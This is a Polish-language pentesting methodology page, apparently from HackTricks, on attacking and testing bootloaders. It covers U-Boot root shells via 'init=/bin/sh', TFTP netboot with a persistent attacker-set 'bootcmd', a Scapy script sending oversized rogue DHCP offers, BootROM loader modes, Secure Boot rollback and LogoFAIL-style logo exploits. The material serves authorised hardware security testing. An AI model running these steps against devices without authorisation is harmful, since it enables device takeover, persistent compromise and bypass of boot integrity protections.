# Testowanie bootloadera

{{#include ../../banners/hacktricks-training.md}}

Poniższe kroki są zalecane do modyfikowania konfiguracji startowych urządzenia i testowania bootloaderów takich jak U-Boot i ładowarki klasy UEFI. Skoncentruj się na uzyskaniu wczesnego wykonywania kodu, ocenie ochrony podpisów/rollback oraz nadużyciu ścieżek recovery lub netboot.

Related: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot quick wins and environment abuse

1. Access the interpreter shell
- Podczas rozruchu naciśnij znany klawisz przerwania (często dowolny klawisz, 0, spacja lub specyficzna dla płytki „magiczna” sekwencja) przed wykonaniem `bootcmd`, aby dostać się do promptu U-Boot.

2. Inspect boot state and variables
- Przydatne polecenia:
- `printenv` (zrzut środowiska)
- `bdinfo` (informacje o płytce, adresy pamięci)
- `help bootm; help booti; help bootz` (obsługiwane metody bootowania kernela)
- `help ext4load; help fatload; help tftpboot` (dostępne loadery)

3. Modify boot arguments to get a root shell
- Dopisz `init=/bin/sh`, aby kernel uruchomił shell zamiast normalnego init:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot from your TFTP server
- Skonfiguruj sieć i pobierz kernel/fit image z LAN:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Persist changes via environment
- Jeśli przechowywanie env nie jest write-protected, możesz upersistować kontrolę:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Sprawdź zmienne takie jak `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets`, które wpływają na ścieżki fallback. Niewłaściwe wartości mogą umożliwić wielokrotne przerwania do shella.

6. Check debug/unsafe features
- Szukaj: `bootdelay` > 0, `autoboot` wyłączone, nieograniczone `usb start; fatload usb 0:1 ...`, możliwość `loady`/`loads` przez serial, `env import` z niezaufanych mediów oraz kerneli/ramdisków ładowanych bez sprawdzania podpisów.

7. U-Boot image/verification testing
- Jeśli platforma twierdzi, że ma secure/verified boot z FIT images, spróbuj zarówno unsigned jak i zmodyfikowanych obrazów:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- Brak `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` lub legacy zachowanie `verify=n` często pozwala na bootowanie dowolnych payloadów.

## Network-boot surface (DHCP/PXE) and rogue servers

8. PXE/DHCP parameter fuzzing
- Legacy BOOTP/DHCP w U-Boot miało problemy z bezpieczeństwem pamięci. Na przykład CVE‑2024‑42040 opisuje ujawnienie pamięci przez przygotowane odpowiedzi DHCP, które mogą leak bajty z pamięci U-Boot z powrotem na sieć. Przetestuj ścieżki DHCP/PXE z nadmiernie długimi/krawędziowymi wartościami (option 67 bootfile-name, vendor options, file/servername fields) i obserwuj zawieszania/leaki.
- Minimalny snippet Scapy do obciążenia parametrów boot podczas netboot:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Zweryfikuj również, czy pola nazwy pliku PXE są przekazywane do logiki shell/loader bez sanitacji, gdy są łańcuchowane do skryptów provisioning po stronie OS.

9. Rogue DHCP server command injection testing
- Uruchom złośliwy serwis DHCP/PXE i spróbuj wstrzyknąć znaki do pól filename lub options, aby trafić do interpreterów poleceń w późniejszych etapach łańcucha boot. Narzędzia takie jak Metasploit’s DHCP auxiliary, `dnsmasq` lub własne skrypty Scapy sprawdzają się dobrze. Najpierw odizoluj sieć laboratoryjną.

## SoC ROM recovery modes that override normal boot

Wiele SoC udostępnia BootROM "loader" mode, który zaakceptuje kod przez USB/UART nawet gdy obrazy w flash są nieprawidłowe. Jeśli secure-boot fuse/OTP nie są zablokowane, może to zapewnić arbitralne wykonywanie kodu bardzo wcześnie w łańcuchu.

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) or `imx-usb-loader`.
- Example: `imx-usb-loader u-boot.imx` to push and run a custom U-Boot from RAM.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` or `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Example: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` to stage a loader and upload a custom U-Boot.

Oceń, czy urządzenie ma wypalone eFuses/OTP dla secure-boot. Jeśli nie, tryby BootROM download często obejdą wyższe poziomy weryfikacji (U-Boot, kernel, rootfs) poprzez wykonanie twojego first-stage payloadu bezpośrednio z SRAM/DRAM.

## UEFI/PC-class bootloaders: quick checks

10. ESP tampering and rollback testing
- Zamontuj EFI System Partition (ESP) i sprawdź komponenty loadera: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, ścieżki logotypów vendorów.
- Spróbuj bootować z przywróconymi lub znanymi podatnymi, podpisanymi komponentami boot, jeśli Secure Boot revocations (dbx) nie są aktualne. Jeśli platforma nadal ufa starym shimom/bootmanagerom, często możesz załadować swój kernel lub `grub.cfg` z ESP, aby uzyskać persistence.

11. Boot logo parsing bugs (LogoFAIL class)
- Kilku OEM/IBV firmware było podatnych na błędy parsowania obrazów w DXE, które przetwarzają boot logo. Jeśli atakujący może umieścić spreparowany obraz na ESP w ścieżce specyficznej dla vendor (np. `\EFI\<vendor>\logo\*.bmp`) i zrestartować, możliwe jest wykonanie kodu w early boot nawet przy włączonym Secure Boot. Sprawdź, czy platforma akceptuje obrazy dostarczone przez użytkownika i czy te ścieżki są zapisywalne z poziomu OS.

## Hardware caution

Zachowaj ostrożność przy interakcji z SPI/NAND flash podczas wczesnego bootu (np. uziemianie pinów, aby obejść odczyty) i zawsze konsultuj się z datasheetem flasha. Nieprawidłowo wykonane zwarcia mogą uszkodzić urządzenie lub programator.

## Notes and additional tips

- Spróbuj `env export -t ${loadaddr}` i `env import -t ${loadaddr}`, aby przenieść blob środowiska między RAM a storage; niektóre platformy pozwalają importować env z wymiennych mediów bez uwierzytelnienia.
- Dla persistence na systemach Linux, które bootują przez `extlinux.conf`, modyfikacja linii `APPEND` (w celu wstrzyknięcia `init=/bin/sh` lub `rd.break`) na partycji boot często wystarcza, gdy nie ma wymuszonych checków podpisów.
- Jeśli userland udostępnia `fw_printenv/fw_setenv`, zweryfikuj że `/etc/fw_env.config` odpowiada rzeczywistemu magazynowi env. Błędnie skonfigurowane offsety pozwalają czytać/pisać nieprawidłowy region MTD.

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)

{{#include ../../banners/hacktricks-training.md}}
